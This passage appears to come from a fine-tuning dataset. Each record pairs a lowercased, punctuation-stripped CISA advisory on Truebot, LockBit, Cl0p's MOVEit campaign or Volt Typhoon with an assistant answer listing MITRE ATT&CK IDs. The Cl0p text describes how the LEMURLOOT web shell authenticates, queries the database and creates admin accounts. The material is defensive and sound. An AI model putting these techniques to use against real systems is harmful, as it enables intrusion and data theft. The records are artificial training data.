cobalt strike flawedgrace4 mar104451551v1 clear truebot activity infects us canada based networks5 red canary raspberry robin delivery vector6 microsoft raspberry robin worm part larger ecosystem preransomware activity7 telsy flawedgrace rat8 vmware security blog carbon blacks truebot detection9 github dfir report truebot malware yara rule additional sources alarming surge truebot activity revealed new delivery vectors thehackernewscomtruebot analysis part 1truebot analysis part 2truebot analysis part 3truebot exploits netwrix vulnerabilitytruebot malware delivery evolves infects businesses us elsewheremalpediasilence downloaderprinter spooling fix papercut acknowledgements vmware carbon black mandiant contributed csa disclaimer information report provided informational purposes cisa authoring agencies endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa cosealers product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1005, T1016, T1027, T1027.001, T1036, T1036.008, T1048, T1055, T1055.001, T1057, T1059, T1070.004, T1071, T1082, T1091, T1095, T1105, T1112, T1113, T1124, T1129, T1189, T1190, T1204.001, T1204.002, T1210, T1518.001, T1550.002, T1563.002, T1566.002, T1570, T1573.002, T1620, T1622"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary 2022 lockbit deployed ransomware variant across world continues prolific 2023 since january 2020 affiliates using lockbit attacked organizations varying sizes across array critical infrastructure sectors including financial services food agriculture education energy government emergency services healthcare manufacturing transportation lockbit ransomware operation functions ransomwareasaservice raas model affiliates recruited conduct ransomware attacks using lockbit ransomware tools infrastructure due large number unconnected affiliates operation lockbit ransomware attacks vary significantly observed tactics techniques procedures ttps variance observed ransomware ttps presents notable challenge organizations working maintain network security protect ransomware threat cybersecurity infrastructure security agency cisa federal bureau investigation fbi multistate information sharing analysis center msisac following international partners hereafter referred authoring organizations releasing cybersecurity advisory csa detailing observed activity lockbit ransomware incidents providing recommended mitigations enable network defenders proactively improve organizations defenses ransomware operation australian cyber security centre acsc canadian centre cyber security cccs united kingdoms national cyber security centre ncscuk national cybersecurity agency france anssi germanys federal office information security bsi new zealands computer emergency response team cert nz national cyber security centre ncsc nz authoring organizations encourage implementation recommendations found csa reduce likelihood impact future ransomware incidents understanding ransomware threat actors lockbit pdf 124 mb technical details note advisory uses mitre attck enterprise framework version 131 see mitre attck tactics techniques section tables lockbits activity mapped mitre attck tactics techniques introduction lockbit raas affiliates negatively impacted organizations large small across world 2022 lockbit active global ransomware group raas provider terms number victims claimed data leak site1 raas cybercrime group maintains functionality particular ransomware variant sells access ransomware variant individuals groups operators often referred affiliates supports affiliates deployment ransomware exchange upfront payment subscription fees cut profits combination upfront payment subscription fees cut profits methods lockbit used successfully attract affiliates include limited assuring payment allowing affiliates receive ransom payments sending cut core group practice stands stark contrast raas groups pay first disburse affiliates cut disparaging raas groups online forums engaging publicitygenerating activities stunts paying people get lockbit tattoos putting 1 million bounty information related realworld identity lockbits lead goes persona lockbitsupp developing maintaining simplified pointandclick interface ransomware making accessible lower degree technical skill2 3 lockbit successful innovation ongoing development groups administrative panel raas supporting functions parallel affiliates work lockbit notable variants constantly revising ttps used deploying executing ransomware table 1 shows lockbit raass innovation development table 1 evolution lockbit raas lockbit 20 lockbit 30 lockbit green lockbit linuxesxi locker still available affiliates use lockbits panel lockbit statistics percentage ransomware incidents attributed lockbit australia april 1 2022 march 31 2023 lockbit made 18 total reported australian ransomware incidents figure includes variants lockbit ransomware solely lockbit 30 canada 2022 lockbit responsible 22 attributed ransomware incidents canada10 new zealand 2022 cert nz received 15 reports lockbit ransomware representing 23 2022 ransomware reports united states 2022 16 state local tribal tribunal sltt government ransomware incidents reported msisac identified lockbit attacks included ransomware incidents impacting municipal governments county governments public higher education k12 schools emergency services eg law enforcement number lockbit ransomware attacks us since 2020 1700 attacks according fbi total us ransoms paid lockbit approximately 91m since lockbit activity first observed us january 5 2020 earliest observed lockbit activity australia earliest documented occurrence lockbit 30 early august 2022 canada first recorded instance lockbit activity canada march 2020 new zealand first recorded incident involving lockbit ransomware march 2021 united states lockbit activity first observed january 5 2020 recently observed lockbit activity australia april 21 2023 new zealand february 2023 united states recently may 25 2023 operational activity related lockbit france since first case july 2020 present anssi handled 80 alerts linked lockbit ransomware accounts 11 ransomware cases handled anssi period 13 cases anssi able confirm deny breach constituents networks alerts related threat actors online claims far 69 confirmed incidents handled anssi table 2 shows lockbit activity observed anssi versus overall ransomware activity tracked computer emergency response teamfrance certfr table 2 anssiobserved lockbit vs overall ransomware activity table 3 shows number instances different lockbit strains observed anssi july 2020 present table 3 anssiobserved lockbit strain number instances name either obtained anssis victims investigations includes incidents multiple strains figure 1 anssiobserved lockbit strains year incidents handled anssi infer lockbit 30 widely took lockbit 20 original lockbit strain 2022 two cases victims infected many three different strains lockbit lockbit 20red lockbit 30black lockbit green leak sites authoring agencies observe data leak sites attackers publish names captured data victims pay ransom hush money additionally sites used record alleged victims threatened data leak term victims may include attacked threatened blackmailed attack taken place leak sites show portion lockbit affiliates victims subjected secondary extortion since 2021 lockbit affiliates employed double extortion first encrypting victim data exfiltrating data threatening post stolen data leak sites lockbit reveals names leaked data victims refuse pay primary ransom decrypt data lockbit victims may never named exfiltrated data posted leak sites result leak sites reveal portion lockbit affiliates total victims reasons leak sites reliable indicator lockbit ransomware attacks occurred date data publication leak sites may months lockbit affiliates actually executed ransomware attacks q1 2023 total 1653 alleged victims observed lockbit leak sites introduction lockbit 20 lockbit 30 leak sites changed sources choosing differentiate leak sites lockbit versions others ignoring differentiation time different evolutions lockbit address layout lockbit leak sites changed aggregated common denominator lockbit name introduction lockbit 20 end q2 2021 immediate impact cybercriminal market due multiple raas operations shutting may june 2021 eg darkside avaddon lockbit competed raas operations like hive raas fill gap cybercriminal market leading influx lockbit affiliates figure 2 shows alleged number victims worldwide lockbit leak sites starting q3 2020 figure 2 shows alleged number victims worldwide lockbit leak sites starting q3 2020 figure 2 alleged number victims worldwide lockbit leak sites tools intrusions lockbit affiliates observed using various freeware opensource tools intended legal use repurposed lockbit tools used range malicious cyber activity network reconnaissance remote access tunneling credential dumping file exfiltration use powershell batch scripts observed across intrusions focus system discovery reconnaissance passwordcredential hunting privilege escalation artifacts professional penetrationtesting tools metasploit cobalt strike also observed table 4 shows list legitimate freeware opensource tools lockbit affiliates repurposed ransomware operations legitimate freeware opensource tools mentioned product publicly available legal use tools threat actor attributed freeware opensource tools absent specific articulable facts tending show used direction control threat actor table 4 freeware opensource tools used lockbit affiliates common vulnerabilities exposures cves exploited based secondary sources noted affiliates exploit older vulnerabilities like cve202122986 f5 icontrol rest unauthenticated remote code execution vulnerability well newer vulnerabilities cve20230669 fortra goanyhwere managed file transfer mft remote code execution vulnerability cve202327350 papercut mfng improper access control vulnerability lockbit affiliates documented exploiting numerous cves including cve202144228 apache log4j2 remote code execution vulnerability cve202122986 f5 bigip bigiq centralized management icontrol rest remote code execution vulnerability cve20201472 netlogon privilege escalation vulnerability cve20190708 microsoft remote desktop services remote code execution vulnerability cve201813379 fortinet fortios secure sockets layer ssl virtual private network vpn path traversal vulnerability information cves see cisas known exploited vulnerabilities kev catalog post detonation ttps lockbit affiliates target organization responsible managing organizations networks cert nz observed lockbit affiliates attempt secondary ransomware extortion detonation lockbit variant primary target primary target hit lockbit affiliates attempt extort companies customers primary target extortion form secondary ransomware locks services customers consume additionally primary targets customers may extorted lockbit affiliates threatening release customers sensitive information mitre attck tactics techniques tables 516 show lockbit affiliate tactics techniques referenced advisory table 5 lockbit affiliates attck techniques enterprise initial access table 6 lockbit affiliates attck techniques enterprise execution table 7 lockbit affiliates attck techniques enterprise persistence table 8 lockbit affiliates attck techniques enterprise privilege escalation table 9 lockbit affiliates attck techniques enterprise defense evasion table 10 lockbit affiliates attck techniques enterprise credential access table 11 lockbit affiliates attck techniques enterprise discovery table 12 lockbit affiliates attck techniques enterprise lateral movement table 13 lockbit affiliates attck techniques enterprise collection table 14 lockbit affiliates attck techniques enterprise command control table 15 lockbit affiliates attck techniques enterprise exfiltration table 16 lockbit affiliates attck techniques enterprise impact mitigations authoring organizations recommend implementing mitigations listed improve cybersecurity posture better defend lockbits activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections listed mitigations ordered mitre attck tactic mitigations apply multiple mitre attck tactics listed tactic occurs earliest incidents lifecycle example account use polices mitigations initial access persistence privilege escalation credential access would listed initial access mitigations initial access consider implementing sandboxed browsers protect systems malware originating web browsing sandboxed browsers isolate host machine malicious code require accounts password logins eg service account admin accounts domain admin accounts comply nist standards developing managing password policiescpg 2l enforce use longer passwords consisting least 15 characters lengthcpg 2b 2c store passwords salted hashed format using industryrecognized password hashing algorithms prevent use commonly used knowncompromised passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install softwarecpg 2q implement filters email gateway filter emails known malicious indicators known malicious subject lines block suspicious ip addresses firewallcpg 2m install web application firewall configure appropriate rules protect enterprise assets segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement isolate webfacing applications minimize spread ransomware across networkcpg 2f follow leastprivilege best practice requiring administrators use administrative accounts managing systems use simple user accounts nonadministrative taskscpg 2e enforce management audit user accounts administrative privileges configure access controls according principle least privilegecpg 2e implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats publicfacing applications must patched timely manner vulnerabilities often exploited directly threat actor closely monitoring threat landscape threat actors often take advantage vulnerabilities systems patched organizations patch vulnerable software hardware systems within 24 48 hours vulnerability disclosed prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e restrict service accounts remotely accessing systems configure group policy deny log locally deny log terminal services deny access computer network service accounts limit ability compromised service accounts used lateral movement block direct internet access administration interfaces eg application protocol interface api remote access require phishingresistant multifactor authentication mfa services extent possible particularly webmail virtual private networks privileged accounts access critical systemscpg 2h consolidate monitor defend internet gateways install regularly update enable realtime detection antivirus software hosts raise awareness phishing threats organization phishing one primary infection vectors ransomware campaigns employees receive practical training risks associated regular use email rise sophisticated phishing methods using stolen email communication artificial intelligence ai systems chatgpt distinction legitimate malicious emails becomes complex particularly applies employees corporate divisions deal high volume external email communication eg staff recruitmentcpg 2i 2j consider adding external email warning banner emails sent received outside organizationcpg 2m review internetfacing services disable services longer business requirement exposed restrict access users explicit requirement access services ssl vpn rdp internetfacing services must used control access allowing access admin ip rangecpg 2x review domain controllers servers workstations active directories new andor unrecognized accounts regularly verify security level active directory domain checking misconfigurations execution develop regularly update comprehensive network diagrams describes systems data flows within organizations networkscpg 2p control restrict network connections accordingly network flow matrix enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical os registry interaction possibility threat actors powershell use ensure powershell instances configured use latest version module script block transcription logging enabled enhanced logging two logs record powershell activity powershell windows event log powershell operational log recommended turn two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large reasonably practical configure windows registry require uac approval psexec operations requiring administrator privileges reduce risk lateral movement psexec privilege escalation disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterallycpg 2n enable credential guard protect windows system credentials enabled default windows 11 enterprise 22h2 windows 11 education 22h2 credential guard prevents credential dumping techniques local security authority lsa secrets aware enabling security control downsides particular longer use new technology local area network lan manager ntlm classic authentication single signon kerberos unconstrained delegation well data encryption standard des encryption implement local administrator password solution laps possible os older windows server 2019 windows 10 versions laps built note authoring organizations recommend organizations upgrade windows server 2019 windows 10 greater defense evasion apply local security policies control application execution eg software restriction policies srp applocker windows defender application control wdac strict allowlist establish application allowlist approved software applications binaries allowed executed system measure prevents unwanted software run usually application allowlist software also used define blocklists execution certain programs blocked example cmdexe powershellexecpg 2q credential access restrict ntlm uses security policies firewalling discovery disable unused ports disable ports used business purposes eg rdptcp port 3389 close unused rdp ports lateral movement identify active directory control paths eliminate critical among according business needs assets identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity networkcpg 1e edr tools particularly useful detecting lateral connections insight common uncommon network connections host command control implement tiering model creating trust zones dedicated organizations sensitive assets vpn access considered trusted network zone organizations instead consider moving zero trust architectures exfiltration block connections known malicious systems using transport layer security tls proxy malware often uses tls communicate infrastructure threat actor using feeds known malicious systems establishment connection c2 server prevented use web filtering cloud access security broker casb restrict monitor access publicfile sharing services may used exfiltrate data network impact implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloudcpg 2r maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization ensures severely interrupted andor irretrievable datacpg 2r acsc recommends organizations follow 321 backup strategy organizations three copies data one copy production data two backup copies two different media disk tape one copy kept offsite disaster recovery ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k 2r implement mitigations defenseindepth implementing multiple mitigations within defenseindepth approach help protect ransomware lockbit cert nz explains ransomware happens stop applying mitigations critical controls provide stronger defense detect prevent respond ransomware organizations data encrypted understanding common attack vectors organizations identify gaps network defenses implement mitigations noted advisory harden organizations ransomware attacks figure 3 ransomware attack broken three phases initial access cyber actor looking way network consolidation preparation actor attempting gain access devices impact target actor able steal encrypt data demand ransom figure 3 shows mitigationscritical controls various colored hexagons working together stop ransomware attacker accessing network steal encrypt data initial access phase mitigations working together deny attacker network access include securing internetexposed services patching devices implementing mfa disabling macros employing application allowlisting using logging alerting consolidation preparation phase mitigations working together keep attacker accessing network devices patching devices using network segmentation enforcing principle least privilege implementing mfa using logging alerting finally impact target phase mitigations working together deny degrade attackers ability steal andor encrypt data includes using logging alerting using maintaining backups employing application allowlisting critical controls key figure 3 stopping ransomware using layered mitigations validate security controls addition applying mitigations authoring organizations recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring organizations recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 516 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process authoring organizations recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources acsc see 202303 acsc ransomware profile lockbit 30 additional information cisa stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts information nocost cyber hygiene services available cyber hygiene services ransomware readiness assessment cisa nsa fbi msisac see stopransomware guide developed joint ransomware task force jrtf provide onestop resource help organizations reduce risk ransomware incidents best practices detect prevent respond recover including stepbystep approaches address potential attacks fbi cisa see alert aa23075a stopransomware lockbit 30 information iocs ttps identified fbi investigations recently march 2023 msisac see center internet security cis critical security controls cis controls httpswwwcisecurityorginsightswhitepapersciscommunitydefensemodel20for information strengthening organizations cybersecurity posture implementing prescriptive prioritized simplified set best see cis community defense model 20 cdm 20 effectiveness cis controls prevalent types attacks cdm 20 used design prioritize implement improve organizations cybersecurity program see blueprint ransomware defense clear actionable framework ransomware mitigation response recovery built around cis controls ncscuk see guidance mitigating malware ransomware attacks information defending organizations malware ransomware attacks bsi see bsis ransomware facts defense strategies comprehensive collection resources ransomware prevention detection reaction note resources german cccs see cccss ransomware playbook itsm00099 information ransomware prevention response see cccss top 10 security actions based analysis cyber threat trends help minimize intrusions impacts successful cyber intrusion cert nz see cert nzs security awareness building creating effective security awareness program assist organizations providing adequate security awareness training personnel creating positive security culture businesses find information developing incident response plan creating contact list communicating ransomware incidents cert nzs creating incident response plan ncsc nz guidance ransomware public service agencies see ncsc nzs ransomware organization protected prepared reporting authoring organizations encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom authoring organizations urge promptly report ransomware incidents countrys respective authorities australia australian organizations impacted require assistance regard ransomware incident contact acsc via 1300 cyber1 1300 292 371 submitting report cybergovau canada canadian victims ransomware encouraged consider reporting cyber incidents law enforcement eg local police canadian antifraud centre well canadian centre cyber security online via cyber portal france individuals small organizations seek assistance cybermalveillance httpswwwcybermalveillancegouvfr larger organizations well public regulated entities request assistance certfr via certfrssigouvfr germany german victims ransomware encouraged consider reporting cyber incidents law enforcement eg local police central contact point cybercrime well federal office information security bsi via reporting information portal new zealand new zealand organizations businesses report security incidents ncsc incidentsncscgovtnz call 04 498 7654 cert nz httpswwwcertgovtnzitspecialistsreportanincident iropscertgovtnz united states report ransomware incidents alocal fbi field office cisas 247 operations center reportcisadhsgov cisagovreport 1844saycisa 18447292472 available please include information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact sltts email socmsisacorg call 866 7874722 united kingdom uk organizations report suspected compromises ncsc disclaimer information report provided informational purposes authoring organizations endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring authoring organizations references1 lockbit blackcat royal dominate ransomware scene2 ransomware diaries volume 13 lockbit ransomware operate4 ransomware spotlight lockbit5 analysis impact lockbit ransomwares first linux vmware esxi variant6 first look builder lockbit 30 black7 lockbit ransomware gang releases lockbit green version8 lockbit ransomware targeting apple macos devices9 apples macs long escaped ransomware may changing10 intelligence agency says ransomware group russian ties poses enduring threat canada product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.001, T1021.001, T1021.002, T1027, T1027.002, T1046, T1048, T1059.003, T1070.001, T1070.004, T1071.001, T1071.002, T1072, T1078, T1082, T1095, T1110, T1133, T1189, T1190, T1219, T1480.001, T1482, T1484.001, T1485, T1486, T1489, T1490, T1547, T1548, T1555.003, T1560.001, T1562, T1562.001, T1566, T1567, T1567.002, T1569.002, T1572"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats cl0p ransomware take inventory assets data identifying authorized unauthorized devices software grant admin privileges access necessary establishing software allow list executes legitimate applications monitor network ports protocols services activating security configurations network infrastructure devices firewalls routers regularly patch update software applications latest versions conduct regular vulnerability assessments updated june 16 2023 csa rereleased remove old fortra goanywhere campaign ip addresses add new ip addresses see update end update summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint csa disseminate known cl0p ransomware iocs ttps identified fbi investigations recently june 2023 according open source information beginning may 27 2023 cl0p ransomware gang also known ta505 began exploiting previously unknown sql injection vulnerability cve202334362 progress softwares managed file transfer mft solution known moveit transfer internetfacing moveit transfer web applications infected web shell named lemurloot used steal data underlying moveit transfer databases similar spates activity ta505 conducted zerodayexploitdriven campaigns accellion file transfer appliance fta devices 2020 2021 fortralinoma goanywhere mft servers early 2023 fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood impact cl0p ransomware ransomware incidents download pdf version stix json file report aa23158a pdf pdf 74097 kb aa23158a stix xml xml 16528 kb aa23158a json json 9333 kb technical details note advisory uses mitre attck enterprise framework version 13 see mitre attck enterprise referenced tactics techniques appearing february 2019 evolving cryptomix ransomware variant cl0p leveraged ransomware service raas largescale spearphishing campaigns used verified digitally signed binary bypass system defenses cl0p previously known use double extortion tactic stealing encrypting victim data refusing restore victim access publishing exfiltrated data tor via cl0pleaks website 2019 ta505 actors leveraged cl0p ransomware final payload phishing campaign involving macroenabled document used get2 malware dropper downloading sdbot flawedgrace recent campaigns beginning 2021 cl0p preferred rely mostly data exfiltration encryption beyond cl0p ransomware ta505 known frequently changing malware driving global trends criminal malware distribution considered one largest phishing malspam distributors worldwide ta505 estimated compromised 3000 usbased organizations 8000 global organizations ta505 operated raas acted affiliate raas operations initial access broker iab selling access compromised corporate networks customer iabs large botnet operator specializing financial fraud phishing attacks campaign 2020 2021 ta505 used several zeroday exploits install web shell named dewmode internetfacing accellion fta servers similarly recent exploitation moveit transfer sql injection vulnerability used install web shell enabled ta505 execute operating system commands infected server steal data late january 2023 cl0p ransomware group launched campaign using zeroday vulnerability catalogued ascve20230669 target goanywhere mft platform group claimed exfiltrated data goanywhere mft platform impacted approximately 130 victims course 10 days lateral movement victim networks goanywhere mft identified suggesting breach limited goanywhere platform next several weeks exfiltrated data parsed group ransom notes sent upperlevel executives victim companies likely identified open source research ransom notes threatened publish stolen files cl0p data leak site victims pay ransom amount cl0ps toolkit contains several malware types collect information including following flawedammyyflawedgrace remote access trojan rat collects information attempts communicate command control c2 server enable download additional malware components sdbot rat propagates infection exploiting vulnerabilities dropping copies removable drives network shares also capable propagating shared though peertopeer p2p networks sdbot used backdoor enable commands functions executed compromised computer malware uses application shimming persistence avoid detection truebot firststage downloader module collect system information take screenshots developed attributed silence hacking group connecting c2 infrastructure truebot instructed load shell code dlls download additional modules run delete case ta505 truebot used download flawedgrace cobalt strike beacons cobalt strike used expand network access gaining access active directory ad server dewmode web shell written php designed target accellion fta devices interact underlying mysql databaseand used steal data compromised device1505003 lemurloot web shell written c designed target moveit transfer platform web shell authenticates incoming http requests via hardcoded password run commands download files moveit transfer system extract azure system settings retrieve detailed record information create insert delete particular user responding request web shell returns data gzip compressed format cve202334362 moveit transfer vulnerability moveit typically used manage organizations file transfer operations web application supports mysql microsoft sql server azure sql database engines may 2023 cl0p ransomware group exploited sql injection zeroday vulnerability cve202334362 install web shell named lemurloot moveit transfer web applications1 lemurloot used method persistence information gathering data stealing cve202334362 webshell imports multiple libraries including moveitdmzclasslib moveitdmzapplicationfiles moveitdmzapplicationusers interact moveit managed file transfer software web shell initially observed name human2aspx effort masquerade legitimate humanaspx file present part moveit transfer software upon installation web shell creates random 36 character password used authentication web shell interacts operators awaiting http requests containing header field named xsilockcomment must value assigned equal password established upon installation web shell authenticating web shell operators pass commands web shell retrieve microsoft azure system settings azure blob storage azure blob storage account azure blob key azure blob container using following query select fid finstid ffolderid filesize fname name uloginname uploader frfolderpath frname fname folders fr files f left join users u fuploadusername uusername ffolderid frid figure 2 enumerate underlying sql database store string sent operator retrieve file name matching string moveit transfer system create new administrator privileged account randomly generated username loginname realname values set health check service delete account loginname realname values set health check service figure 2 lemurloot webshell code interacts azure progress software announced discovery cve202334362 moveit transfer vulnerability issued guidance known affected versions software upgrades patching based evidence active exploitation cisa added vulnerability known exploited vulnerabilities kevs catalog june 2 2023 moveit transfer critical vulnerability exploit impacts following versions software2 moveit transfer 202300 moveit transfer 20221x moveit transfer 20220x moveit transfer 20211x moveit transfer 20210x moveit transfer 20201x moveit transfer 20200x due speed ease ta505 exploited vulnerability based past campaigns fbi cisa expect see widespread exploitation unpatched software services private public networks iocs related moveit campaign see table 2 detection methods open source deployable yara rules may used detect malicious activity moveit transfer zero day vulnerability information visit github resource section csa13 victim rebuilds web server leaves database intact cl0p user accounts still exist used persistent access system victims use following sql query audit active administrative accounts validate intended accounts present select fromdatabase namedbousers permission30 statusactive deleted0 moveit campaign indicators compromise goanywhere campaign indicators compromise updated june 16 2023 end update mitre attck techniques see tables referenced cl0p tactics techniques used advisory mitigations authoring agencies recommend organizations implement mitigations improve organizations security posture response threat actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisascrosssector cybersecurity performance goals information cpgs including additional recommended baseline protections reduce risk compromise cl0p ransomware reduce threat malicious actors using remote access tools auditing remote access tools network identify currently used andor authorized software reviewing logs execution remote access software detect abnormal use programs running portable executablecpg 2t using security software detect instances remote access software loaded memory requiring authorized remote access solutions used within network approved remote access solutions virtual private networks vpns virtual desktop interfaces vdis blocking inbound outbound connections common remote access software ports protocols network perimeter implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n restrict use powershell using group policy grant specific users casebycase basis typically users administrators manage network windows operating systems oss permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t review domain controllers servers workstations active directories new andor unrecognized accountscpg 4c audit user accounts administrative privileges configure access controls according principle least privilegecpg 2e reduce threat credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally refrain storing plaintext credentials scripts implement timebased access accounts set admin level highercpg 2a 2e addition authoring authorities csa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization limits severity disruption business practicescpg 2r require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least eight characters 64 characters lengthcpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused portscpg 2v consider adding email banner emails received outside organizationcpg 2m disable hyperlinks received emails ensure backup data encrypted immutable ie ensure backup data altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring authorities csa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 2 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reference1 zeroday vulnerability moveit transfer exploited data theft mandiant2 moveit transfer critical vulnerability may 2023 progress community3moveit transfer critical vulnerability cve202334362 rapid response huntresscom reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications cl0p group actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office report incident fbi internet crime complaint center ic3 ic3gov cisa cisagovreport disclaimer information report provided informational purposes cisa fbi endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078, T1133, T1486"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary united states international cybersecurity authorities issuing joint cybersecurity advisory csa highlight recently discovered cluster activity interest associated peoples republic china prc statesponsored cyber actor also known volt typhoon private sector partners identified activity affects networks across us critical infrastructure sectors authoring agencies believe actor could apply techniques sectors worldwide advisory united states national security agency nsa us cybersecurity infrastructure security agency cisa us federal bureau investigation fbi australian signals directorates australian cyber security centre acsc communications security establishments canadian centre cyber security cccs new zealand national cyber security centre ncscnz united kingdom national cyber security centre ncscuk hereafter referred authoring agencies provides overview hunting guidance associated best practices detect activity one actors primary tactics techniques procedures ttps living land uses builtin network administration tools perform objectives ttp allows actor evade detection blending normal windows system network activities avoid endpoint detection response edr products would alert introduction thirdparty applications host andlimit amount activity captured default logging configurations builtin tools actor uses wmic ntdsutil netsh powershell advisory provides examples actors commands along detection signatures aid network defenders hunting activity many behavioral indicators included also legitimate system administration commands appear benign activity care taken assume findings malicious without investigation indications compromise download pdf version report 723 kb download spanish version report 47918 kb downloadable copy iocs see peoples republic china statesponsored cyber actor living land evade detection xml 3457 kb peoples republic china statesponsored cyber actor living land evade detection spanish pdf 47918 kb downloadable copy iocs json format see aa23144astixjson technical details advisory uses mitre attck enterprise framework version 13 see appendix mitre attck techniques referenced tactics techniques background authoring agencies aware recent peoples republic china prc statesponsored cyber activity identified potential indicators associated 